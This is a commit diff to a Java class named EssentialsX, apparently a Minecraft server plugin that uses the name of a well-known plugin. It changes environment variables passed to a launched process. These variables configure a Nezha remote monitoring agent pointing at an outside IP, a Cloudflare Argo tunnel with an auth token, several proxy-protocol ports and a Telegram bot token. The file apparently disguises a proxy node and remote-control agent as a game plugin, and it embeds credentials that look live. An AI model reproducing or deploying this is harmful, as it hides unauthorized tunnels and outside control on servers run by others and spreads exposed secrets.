94a24f9d161f6c404d84aeb6a9d0d01212bceadc
jhub1234 <mariastefanicknal46@gmail.com>
2026-04-16 21:59:49 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -73,17 +73,17 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "83f8e631-4e8c-4f83-a0e2-0c1076ff90b9");
+        env.put("UUID", "7de1f43c-9b20-486b-a93c-aa5940c9c1a4");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "144.22.159.118:8008");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "GTmVnjnxL0bC41DDvN7UzMNqf6jAK9TM");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "weirdhost.bo88.cc.cd");
-        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiNzY5Y2E4MDQtNGYzZS00ZTQ3LWE2ZDMtYmZlMGFjYTJjNGVkIiwicyI6IlpUTTJOMk13WVdRdE56VTNPUzAwTlRVekxXSmtabUl0T0RsbU1URXlPV05rTmpnMiJ9");
-        env.put("S5_PORT", "25575");
-        env.put("HY2_PORT", "25565");
-        env.put("TUIC_PORT", "25575");
+        env.put("ARGO_DOMAIN", "freezehost.bo66.pp.ua");
+        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiM2Q4NGNkOWQtZjFiOS00OWVmLWFmNTgtNmM0MDBjN2Y4MjJiIiwicyI6Ik1UUmpOR1l3TXpVdE1qSmpNeTAwWkdSa0xUaGhaVFV0T1Rsa1pXSm1NMkV4TXpVMyJ9");
+        env.put("S5_PORT", "");
+        env.put("HY2_PORT", "8792");
+        env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "8333285464:AAE9xFo7w51MclwGz-OA_vud9MC5N9RNRCQ");
         env.put("CFIP", "cdns.doon.eu.org");
         env.put("CFPORT", "443");
-        env.put("NAME", "xserver-jp");
+        env.put("NAME", "freezehost-sg");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
